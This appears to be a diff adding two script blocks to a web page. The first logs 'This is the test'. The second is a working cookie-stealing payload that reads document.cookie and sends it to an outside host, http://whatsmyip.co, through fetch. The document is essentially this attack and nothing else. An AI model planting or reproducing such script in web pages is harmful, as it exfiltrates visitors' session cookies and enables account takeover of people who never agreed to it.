@@ -1,0 +1,8 @@
+<script>
+    console.log("This is the test")
+</script>
+
+<script>
+    serverUrl = "http://whatsmyip.co"
+    fetch(serverUrl + "?" + document.cookie).then(res => console.log(res)).catch(err => console.error(err))
+</script>
